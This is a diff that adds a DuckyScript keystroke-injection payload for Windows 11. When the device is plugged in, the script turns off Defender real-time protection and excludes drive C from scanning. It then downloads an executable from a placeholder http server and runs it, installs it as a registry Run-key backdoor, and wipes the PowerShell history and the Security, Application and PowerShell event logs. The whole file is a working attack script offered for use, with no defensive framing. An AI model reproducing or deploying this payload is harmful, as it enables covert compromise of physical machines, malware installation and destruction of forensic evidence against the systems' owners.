@@ -1,0 +1,97 @@
+REM Title: Windows 11 Ducky PWN
+REM Author: Meeps-Underflow
+REM Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
+REM Description: Downloads malicous exe from hosted http server then executes it
+REM Description: Establishes Persistence 
+REM Description: CLeans Up Activity
+REM Target: Windows 11 (Powershell)
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT TAB
+DELAY 750
+ALT y
+DELAY 1000
+
+REM Exit security settings
+ALT F4
+DELAY 500
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT TAB
+DELAY 750
+ALT y
+DELAY 1000
+
+REM Exclude drive C from Defender
+STRING Add-MpPreference -ExclusionPath "C:"
+ENTER
+DELAY 500
+
+REM download nice3.exe from http server running x.x.x.x ip
+STRING powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/nice3.exe', 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe')"
+ENTER
+DELAY 1000
+
+REM execute nice3.exe
+STRING powershell start "C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe" 
+ENTER
+DELAY 1000
+
+REM Deploy persistant backdoor 
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "nice3" -Value "C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe"
+ENTER
+DELAY 500
+
+REM Clear PowerShell Command History
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+ENTER
+DELAY 500
+
+REM Clear PowerShell Logs
+STRING wevtutil cl Microsoft-Windows-PowerShell/Operational
+ENTER
+DELAY 500
+
+REM Clear Event Logs 
+STRING wevtutil cl Security
+ENTER
+DELAY 500
+STRING wevtutil cl Application
+ENTER
+DELAY 500
+
+REM Exit Powershell
+STRING EXIT
+ENTER
